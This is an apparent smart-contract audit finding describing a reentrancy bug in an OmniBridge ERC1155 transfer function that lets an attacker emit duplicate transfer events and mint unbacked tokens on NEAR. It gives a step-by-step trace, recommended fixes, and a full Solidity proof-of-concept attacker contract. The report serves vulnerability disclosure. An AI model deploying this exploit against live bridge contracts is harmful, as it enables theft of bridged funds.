Audit Report

## Title
ERC1155 `safeTransferFrom` Callback Enables Reentrancy in `initTransfer1155`, Allowing Unauthorized Token Minting on NEAR - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` increments `currentOriginNonce` at the top of the function but reads `currentOriginNonce` again — after an external `safeTransferFrom` call to an attacker-controlled ERC1155 token — when passing it to `initTransferExtension` and emitting `InitTransfer`. A malicious ERC1155 token can reenter `initTransfer1155` during the callback, causing both the inner (reentrant) and outer calls to emit `InitTransfer` with the same nonce and no tokens actually locked. The NEAR side treats the first emitted event as proof of locked collateral and mints bridged tokens to the attacker with nothing held on EVM.

## Finding Description

In `initTransfer1155` (lines 447–490 of `evm/src/omni-bridge/contracts/OmniBridge.sol`):

```
Line 448:  currentOriginNonce += 1;          // incremented to N
...
Line 458:  IERC1155(tokenAddress).safeTransferFrom(  // external call — triggers onERC1155Received
               msg.sender, address(this), tokenId, amount, ""
           );
...
Line 471:  initTransferExtension(..., currentOriginNonce, ...)  // reads AFTER external call
Line 483:  emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)  // reads AFTER external call
```

The nonce is incremented at line 448 but `currentOriginNonce` is never cached — it is read again at lines 471 and 483 after the external call returns. There is no `nonReentrant` modifier anywhere in the contract (confirmed: zero matches for `nonReentrant`/`ReentrancyGuard` across all `.sol` files).

**Reentrancy trace** (assume `currentOriginNonce = N-1` before attack):

1. Outer `initTransfer1155` call: line 448 increments `currentOriginNonce` to N.
2. Line 458 calls `safeTransferFrom` on the malicious ERC1155 token.
3. The ERC1155 standard requires `safeTransferFrom` to invoke `onERC1155Received` on the recipient. The bridge's `onERC1155Received` (lines 522–535) only checks `operator != address(this)`. Because the bridge itself is the caller of `safeTransferFrom`, `operator == address(this)`, so the check passes — the callback is accepted from any token.
4. The malicious token's `safeTransferFrom` reenters `initTransfer1155` (inner call): line 448 increments `currentOriginNonce` to N+1. The inner `safeTransferFrom` (depth 2) does nothing and returns. The inner call reads `currentOriginNonce = N+1` at lines 471 and 483, emitting `InitTransfer(nonce=N+1)` — **no tokens locked**.
5. Control returns to the outer call. The outer `safeTransferFrom` returns (also without transferring tokens). The outer call reads `currentOriginNonce = N+1` at lines 471 and 483, emitting a second `InitTransfer(nonce=N+1)` — **same nonce, still no tokens locked**.
6. NEAR processes the first `InitTransfer(nonce=N+1)` (emitted during reentrancy) and mints bridged tokens to the attacker. NEAR rejects the second `InitTransfer(nonce=N+1)` as a duplicate nonce.

The `evm/CLAUDE.md` security invariant at line 34 states: *"Always mutate state (e.g. mark nonce used) before any external call"* — violated here because `currentOriginNonce` is mutated but then re-read after the external call. The invariant at line 36 states: *"`InitTransfer` must only be emitted in a code path where tokens have already been burned/locked"* — also violated.

`initTransfer1155` performs no check that `tokenAddress` is a registered or trusted token, so the attacker does not even need `logMetadata1155` — they can pass any malicious ERC1155 address directly.

## Impact Explanation

The NEAR bridge treats any `InitTransfer` event emitted by the registered EVM bridge contract as proof that tokens are held on EVM. The fraudulent inner event carries a valid nonce and all required fields, causing NEAR to mint bridged tokens with zero EVM collateral locked. This is unauthorized minting of bridged funds — a direct loss of protocol solvency matching the critical impact class: *"Stealing, loss, double-spending, unauthorized minting, or permanent freezing of bridged funds."*

## Likelihood Explanation

- `initTransfer1155` is a public, unpermissioned function callable by any EOA or contract.
- No token allowlist or registration check exists in `initTransfer1155`; any ERC1155 address is accepted.
- The ERC1155 standard mandates the `onERC1155Received` callback — the reentrancy path is unavoidable by design.
- The `onERC1155Received` operator check passes trivially because the bridge is the caller.
- No reentrancy guard exists anywhere in the contract.
- The attacker needs only to deploy one malicious contract and call one public function.
- The attack is repeatable with a fresh nonce each time.

## Recommendation

1. **Cache the nonce before the external call** and use only the cached value thereafter:
   ```solidity
   uint64 nonce = ++currentOriginNonce;
   // ... safeTransferFrom ...
   initTransferExtension(msg.sender, deterministicToken, nonce, ...);
   emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
   ```
2. **Add `ReentrancyGuardUpgradeable`** from OpenZeppelin and apply `nonReentrant` to `initTransfer1155` (and `initTransfer` for consistency).
3. **Verify token receipt** by checking the bridge's ERC1155 balance of `tokenId` before and after `safeTransferFrom` and reverting if the delta is less than `amount`.

## Proof of Concept

Deploy the following contract against a local fork with the bridge deployed:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId, uint128 amount,
        uint128 fee, uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge bridge;
    uint256 public depth;
    uint256 constant TOKEN_ID = 1;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        depth++;
        if (depth == 1) {
            // Reenter: inner call increments nonce to N+1, emits InitTransfer(N+1) with no tokens
            bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
        }
        // depth==2: return without transferring anything
        depth--;
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1000; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }

    function attack() external {
        // No logMetadata1155 needed — initTransfer1155 accepts any token address
        bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
    }
}
```

**Expected result**: Two `InitTransfer` events are emitted with the same nonce. No ERC1155 tokens are held by the bridge. The NEAR relayer processes the first event and mints 100 units to `attacker.near`. The second event is rejected as a duplicate nonce. The attacker holds bridged NEAR tokens backed by zero EVM collateral.
